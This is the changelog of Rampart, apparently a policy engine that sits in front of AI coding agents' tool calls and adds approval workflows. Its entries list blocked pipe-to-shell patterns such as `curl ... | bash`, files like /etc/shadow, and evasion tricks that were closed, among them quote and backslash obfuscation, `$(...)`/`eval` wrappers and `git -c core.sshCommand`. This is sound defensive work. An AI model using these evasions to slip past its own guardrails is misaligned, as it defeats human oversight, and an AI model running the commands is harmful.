# Changelog

All notable changes to Rampart are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

## [0.2.36] — 2026-02-18

### Fixed
- Default policy pipe-to-shell patterns (`curl * | bash`, `wget * | sh`, etc.) now use `**` instead of `*` so they correctly match URLs containing `/`. Previously `curl https://example.com/payload | bash` was silently allowed because `*` does not cross `/` boundaries in glob matching.

## [0.2.35] — 2026-02-18

### Fixed
- `rampart hook` now auto-reads the token from `~/.rampart/token` when `RAMPART_TOKEN` is not set in the environment. Claude Code hooks don't inherit the user's shell environment, so the token was never available at hook runtime — events silently fell back to local-only evaluation and never reached the dashboard. The hook now discovers both the serve URL (`localhost:18275`) and the token from standard locations, with no credentials needed in `settings.json`.
- `rampart serve install` now persists the generated token to `~/.rampart/token` (mode 0600). This is the canonical token location the hook reads from automatically.
- Dashboard now shows hook events. The hook and serve both write to `~/.rampart/audit/` but used different filename prefixes (`audit-hook-YYYY-MM-DD.jsonl` vs `YYYY-MM-DD.jsonl`). The audit API now reads both, so all events appear in the History tab regardless of which component wrote them.

## [0.2.34] — 2026-02-18

### Fixed
- `rampart setup claude-code` now writes the absolute binary path in the hook command (e.g. `/usr/local/bin/rampart hook`) instead of bare `rampart hook`. Claude Code hooks do not inherit the user's shell `PATH`, so the bare name silently failed at runtime.
- Hook removal (`rampart setup claude-code --remove`) now correctly identifies absolute-path hook entries written by the above fix.
- `rampart serve --addr` now validates the value is a valid IP address and returns a clear error on bad input.
- Success output for `rampart setup claude-code` now shows the resolved hook command path so users can verify the correct binary is registered.

### Tests
- Added `TestMemoryStore_Load` and `TestMixedStore_Load` covering embedded policy loading, directory merging, duplicate skipping, and error propagation.

## [0.2.33] — 2026-02-18

### Added
- `rampart serve --addr` flag to bind to a specific interface (e.g. `127.0.0.1` to avoid conflicts with Tailscale/VPN listeners)
- Default embedded policy: `rampart serve` now works out of the box with no `--config` file required
- `/v1/policy` API endpoint for runtime policy introspection (mode, counts, config path)
- Dashboard: 3-tab layout (Active / History / Policy), flex card layout for pending approvals, action:watch badge style

### Changed
- **`action: watch`** replaces `action: log` as the canonical name for the observe-but-allow action. `log` still works but emits a lint deprecation warning. All CLI output, TUI, and webhook formatters updated to use `watch`.
- **Default policy change:** `sudo *` commands now trigger `require_approval` instead of `log`. If you rely on sudo passing through silently, set `action: watch` or `action: allow` explicitly.
- `log-network-exfil` policy removed from standard.yaml — plain `curl`/`wget` are now allowed by default. Only piped execution (`curl ... | bash`) is blocked.
- `rampart serve install` (macOS launchd): added `WorkingDirectory` to plist to prevent CWD issues

### Fixed
- `action: watch` now correctly parsed in all contexts (`ParseAction`, `parseDefaultAction`, policy lint)
- Action rename fully propagated to all consumers (audit CLI stats, status, watch TUI, wrap, Slack/Discord/Teams webhooks)
- Shell profile echo commands shown after `serve install` on macOS and Linux

## [0.2.3] — 2026-02-18

### Added
- **Unified approval system** — `rampart hook` now delegates `require_approval` to a running `rampart serve` instance via `--serve-url`. Approvals can be resolved from the dashboard, `rampart watch`, API, or native Claude Code prompt (fallback).
- **Dashboard v2** — Complete redesign with compact table layout, 4 tabs (Pending, History, Audit Log, Rules), dark/light theme toggle, bulk approve/deny, resizable columns, dangerous command detection.
- **Persist-to-policy** — "Always Allow" creates auto-generated rules in `~/.rampart/policies/auto-allowed.yaml` with clean YAML output and deduplication.
- **Rules management** — View and revoke auto-allowed rules from the dashboard or API (`GET/DELETE /v1/rules/auto-allowed`).
- **Audit API** — `GET /v1/audit/events` (query with filters), `/dates`, `/stats`, `/export` (JSONL download).
- **Directory-based policy loading** — Engine loads all `*.yaml` from a policies directory with `--config-dir`. Auto-includes `~/.rampart/policies/`.
- **Hot reload** — Policies re-read every 30 seconds (configurable via `--reload-interval`), so auto-allowed rules take effect without restart.
- **Configurable approval timeout** — `--approval-timeout` flag on `rampart serve` (default: 5 minutes).
- **Interactive `rampart watch`** — Keybindings: `a` approve, `d` deny, `A` always-allow, `1-9` select, `q` quit.
- **Approval deduplication** — Same tool+command+agent within 60 seconds returns existing approval ID.
- **Hash-chained audit events** for all approval resolutions (approved/denied/always-allowed).
- **Explicit `permissionDecision: "allow"`** for PreToolUse hooks (contributed by @aegixx, PR #51).

### Changed
- **⚠️ Breaking: Empty `when:` clause now matches all tool calls.** Previously, rules with no `when:` conditions silently matched nothing. Now they act as catch-all rules within their policy scope. **If you have rules with empty `when:` clauses, they will now activate.** Review your policies before upgrading.
- Dashboard redesigned from card layout to compact table rows.
- `--serve-token` flag deprecated — prefer `RAMPART_TOKEN` environment variable (flag visible in `ps aux`).
- Lint message for empty `when:` downgraded from warning to info (correct behavior now).

### Fixed
- Approval ordering now deterministic (sorted by creation time).
- Dangerous commands (`rm`, `kill`, `chmod`, `dd`, etc.) never generalized in persist-to-policy.
- Single-token commands kept exact in generalization (`ls` stays `ls`, not `ls *`).
- Atomic policy file writes prevent corruption on concurrent "Always Allow".
- Hook polling respects context cancellation for clean Ctrl-C.
- Dashboard timer updates no longer cause layout shift.
- Double `Stop()` on engine no longer panics.
- Audit dates endpoint no longer leaks server filesystem path.

### Security
- All new API endpoints require Bearer token authentication.
- "Always Allow" button requires confirmation dialog.
- Auto-generated YAML uses `yaml.Marshal` (prevents YAML injection).
- HMAC-signed approval resolve URLs for webhook notifications.

## [0.2.26] — 2026-02-16

### Added
- **Shell subcommand extraction** — `ExtractSubcommands()` detects commands inside `$(...)`, backticks, and `eval` wrappers. Matcher evaluates extracted subcommands against `command_matches` patterns, closing a documented evasion vector. 16 tests + fuzz test
- **Tutorial docs** — "Protect your first agent in 5 minutes" walkthrough and troubleshooting guide with 6 common issues
- **Example policy templates** — `policies/examples/` with web-developer, infrastructure, data-science, and lockdown templates (all with inline tests)
- **CLI test coverage** — 49.3% → 58.3% (3 new test files)

## [0.2.25] — 2026-02-16

### Added
- **Response-side scanning** — PostToolUse hooks evaluate tool output through `EvaluateResponse()`. Default credential leak patterns in `standard.yaml` (AWS keys, GitHub PATs, private keys, OpenAI keys, Slack tokens)
- **Policy linter** — `rampart policy lint` catches common YAML mistakes: unknown fields with typo suggestions, match/when confusion, reason/message confusion, shadowed rules, excessive glob depth. 10 checks (3 error, 5 warning, 2 info)
- **CLI test coverage** — 15 new test files, coverage 37.7% → 49.7%

### Fixed
- **PostToolUse field name** — corrected `tool_result` → `tool_response` per Claude Code docs
- **PostToolUse output format** — uses top-level `decision`/`reason` instead of `hookSpecificOutput`

## [0.2.24] — 2026-02-15

### Added
- **Shell-aware command parsing** — `NormalizeCommand()` strips quotes, backslash escapes, env var prefixes to prevent policy evasion (`'rm' -rf /`, `r\m`, `"rm" -rf /` all now match)
- **`SplitCompoundCommand()`** — handles `&&`, `||`, `;`, pipes — each segment matched independently
- **Policy test framework** — `rampart test policy.yaml` runs inline test suites with colored output, `--verbose` and `--run` filtering
- **Prometheus metrics** — opt-in via `rampart serve --metrics`. 5 metrics: `rampart_decisions_total`, `rampart_eval_duration_seconds`, `rampart_pending_approvals`, `rampart_policy_count`, `rampart_uptime_seconds`
- **Goreleaser Homebrew** — `brews:` section for auto-updating `peg/homebrew-rampart` on release
- **30-second quickstart** — copy-paste install + setup + inline output preview at top of README
- **Collapsible TOC** — README table of contents grouped by category

## [0.2.23] — 2026-02-15

### Security
- **Removed `git` and `sed` from safe binaries** — prevents policy bypass via `git -c core.sshCommand` and `sed -e '1e'`
- **Webhook `FailOpen` default → false** — webhook outages now block instead of silently allowing
- **Go 1.24.13** — resolves 13 reachable stdlib vulnerabilities
- **Audit file permissions 0644 → 0600** — prevents other users from reading audit logs
- **HTTP webhook URL warning** — logs `slog.Warn` for non-HTTPS webhook URLs
- **Daemon API auth fix** — Bearer token now works when HMAC signer is also configured
- **Token removed from dashboard URL** — `rampart serve` prints hint instead of full token
- **Referrer-Policy → no-referrer** — prevents token leakage via referrer headers
- **Approval store capped at 1000** — prevents memory exhaustion from unbounded approvals
- **Reload rejects zero-policy configs** — prevents accidental "allow everything" on bad reload
- **Glob `**` segment limit (max 3)** — prevents quadratic matching complexity
- **`stripLeadingComments` returns empty for all-comment input** — prevents bypass via comment-only payloads

### Added
- **govulncheck in CI** — informational vulnerability scanning on every push
- **SHA-pinned GitHub Actions** — all 3 workflow files use commit hashes
- **CODEOWNERS** — `* @peg`
- **Glob matching limitations documented** — in policy engine and threat model docs

## [0.2.22] — 2026-02-15

### Changed
- **README architecture diagram redesigned** — LR flow, agents grouped, audit as required step
- **`tamper-evident` language** — corrected from `tamper-proof` throughout docs and code
- **Setup command table** — added to README with `--patch-tools` note for OpenClaw

## [0.2.21] — 2026-02-15

### Added
- **GET approval endpoint** — `GET /v1/approvals/:id` for polling approval status
- **OpenClaw shim** — auto-detection and chat-based approval integration

## [0.2.2] — 2026-02-15

### Added
- **Dashboard on `rampart serve`** — embedded approval dashboard now at `/dashboard/` (was daemon-only)
- **Community policy library** — 5 ready-to-use templates: Kubernetes, AWS CLI, Terraform, Docker, Node.js/Python
- **Fuzz tests** — 6 fuzz test suites covering policy parser, condition matcher, engine evaluator, hook parsers, proxy request parser, and command sanitizer
- **Approval dashboard documentation** — full guide with security model, API reference, and hook integration
- **Upgrade and uninstall guides** — covers all install methods, hook removal, and data cleanup

## [0.2.0] - 2026-02-15

### Added
- **`require_approval` action** — block tool calls until a human approves or denies them
- **Claude Code `ask` hook** — `require_approval` maps to Claude Code's native permission prompt (`permissionDecision: "ask"`)
- **MCP proxy blocking** — `require_approval` tools stay visible in `tools/list` but block on `tools/call` until resolved
- **Signed resolve URLs** — HMAC-SHA256 self-authenticating links for webhook recipients (no token needed)
- **Auto-generated signing key** — `~/.rampart/signing.key` created on first run (0600 permissions)
- **`--signing-key` flag** — custom signing key path for `serve` and `daemon` commands
- **`--resolve-base-url` flag** — configurable base URL for approval resolve links
- **Web dashboard security** — X-Frame-Options DENY, Content-Security-Policy, nosniff, no-store headers
- **Dashboard history section** — view resolved approvals with resolution details
- **OpenClaw notifier** — dedicated webhook format for OpenClaw approval integration
- **OpenClaw approval guide** — `docs/guides/openclaw-approval.md`
- **GoReleaser config** — reproducible cross-platform release builds with checksums
- **GitHub Actions release workflow** — automatic releases on tag push
- **CHANGELOG.md** — this file

### Changed
- **BREAKING: Webhook JSON tags are now snake_case** — `"Action"` → `"action"`, `"Tool"` → `"tool"`, etc. Update any webhook consumers that parse field names.
- **Default `notify.on` includes `require_approval`** — approval notifications fire by default without explicit config
- **Go version bumped to 1.24.13** — fixes 13 known vulnerabilities in standard library (crypto/tls, net/url, net/http, crypto/x509, encoding/asn1, encoding/pem, os/exec)
- **Makefile LDFLAGS fixed** — version info now correctly injected into binaries (was using wrong module path)
- **Regex patterns pre-compiled** — `sanitizeCommand()` no longer recompiles 15 regexes per call

### Fixed
- **MCP proxy zombie approvals** — pending approvals now cleaned up on context cancellation and proxy shutdown
- **MCP proxy silent drops** — JSON-RPC error now sent to client on cancel/shutdown (was silent)
- **Dashboard CSP headers** — keywords properly quoted (`'self'`, `'unsafe-inline'`)
- **Dashboard XSS** — approval IDs escaped in `data-id` attributes
- **Dashboard polling** — exponential backoff (2s → 30s) with AbortController to prevent request overlap
- **OpenClaw platform auto-detection** — tightened from substring match to domain-only (openclaw.dev/ai/io)
- **Resolve URL generation** — eliminated mutex-based addr lookup race; uses captured listener address

## [0.1.14] - 2026-02-11

### Added
- Daily audit file rotation (`YYYY-MM-DD.jsonl`)
- Size rotation within day (`.p1.jsonl`, `.p2.jsonl`)

## [0.1.13] - 2026-02-11

### Added
- Heredoc body stripping (`StripHeredocBodies`) to prevent false positives
- Quoted argument stripping for safe binaries (echo, git, cat)
- `command_effective` field in ToolCall params

### Fixed
- Policy gaps: `/etc/shadow`, `/etc/passwd`, `/etc/sudoers` in standard policy
- Doctor only shows hook checks for installed agents
- Shim template uses `/v1/tool/exec` (was `/v1/preflight/exec`)

## [0.1.12] - 2026-02-10

### Added
- `--patch-tools` flag for native OpenClaw file tool patching
- Interactive setup wizard improvements
- `--remove` flag restores tool backups

## [0.1.11] - 2026-02-10

### Added
- Interactive setup wizard (`rampart setup`)
- `rampart doctor` with version check
- `rampart status`, `rampart test`, `rampart log` commands
- `--remove` flag for all agent integrations
- Colored deny messages in terminal
- Enhanced `rampart watch` TUI

## [0.1.8] - 2026-02-09

### Added
- Leading comment stripping for agent frameworks
- Security hardening: path traversal bypass fix, 1MB response body cap, HTTP timeouts
- MCP proxy test coverage (30 tests, was 0%)

### Fixed
- Hot-reload race: fsnotify truncated-file rejection with 100ms delay
- Glob matching: `*` now crosses `/` for leading wildcard patterns

## [0.1.7] - 2026-02-09

### Added
- `--syslog` flag (RFC 5424 syslog output)
- `--cef` flag (Common Event Format for SIEM integration)
- Wazuh integration guide with custom decoder and rules
- `action: webhook` for delegating decisions to external HTTP endpoints

## [0.1.6] - 2026-02-08

### Added
- `rampart mcp scan` — auto-generate policy YAML from MCP server tool lists

## [0.1.5] - 2026-02-08

### Added
- **LD_PRELOAD interception** — `preload/librampart.c` (472 lines C)
- `rampart preload -- codex` for Codex CLI support
- Intercepts execve/execvp/system/popen/posix_spawn

## [0.1.3] - 2026-02-07

### Fixed
- Hot-reload bug: empty config during mid-write → deny-all. Fix: 100ms delay + reject empty configs
- Glob matching: `filepath.Match` `*` doesn't cross `/`. Added `matchWildcardSegments`

## [0.1.2] - 2026-02-07

### Added
- Initial public release
- Policy engine with glob matching
- Claude Code hooks integration
- MCP proxy with tools/list filtering
- HTTP proxy with Bearer auth
- Shell shim (`rampart wrap`)
- Webhook notifications (Slack, Discord, Teams, generic)
- Audit logging (JSONL)
- `rampart watch` TUI
- Standard policy (`policies/standard.yaml`)

[Unreleased]: https://github.com/peg/rampart/compare/v0.2.25...HEAD
[0.2.25]: https://github.com/peg/rampart/compare/v0.2.24...v0.2.25
[0.2.24]: https://github.com/peg/rampart/compare/v0.2.23...v0.2.24
[0.2.26]: https://github.com/peg/rampart/compare/v0.2.25...v0.2.26
[0.2.23]: https://github.com/peg/rampart/compare/v0.2.22...v0.2.23
[0.2.22]: https://github.com/peg/rampart/compare/v0.2.21...v0.2.22
[0.2.21]: https://github.com/peg/rampart/compare/v0.2.2...v0.2.21
[0.2.2]: https://github.com/peg/rampart/compare/v0.2.0...v0.2.2
[0.2.0]: https://github.com/peg/rampart/compare/v0.1.14...v0.2.0
[0.1.14]: https://github.com/peg/rampart/compare/v0.1.13...v0.1.14
[0.1.13]: https://github.com/peg/rampart/compare/v0.1.12...v0.1.13
[0.1.12]: https://github.com/peg/rampart/compare/v0.1.11...v0.1.12
[0.1.11]: https://github.com/peg/rampart/compare/v0.1.8...v0.1.11
[0.1.8]: https://github.com/peg/rampart/compare/v0.1.7...v0.1.8
[0.1.7]: https://github.com/peg/rampart/compare/v0.1.6...v0.1.7
[0.1.6]: https://github.com/peg/rampart/compare/v0.1.5...v0.1.6
[0.1.5]: https://github.com/peg/rampart/compare/v0.1.3...v0.1.5
[0.1.3]: https://github.com/peg/rampart/compare/v0.1.2...v0.1.3
[0.1.2]: https://github.com/peg/rampart/releases/tag/v0.1.2
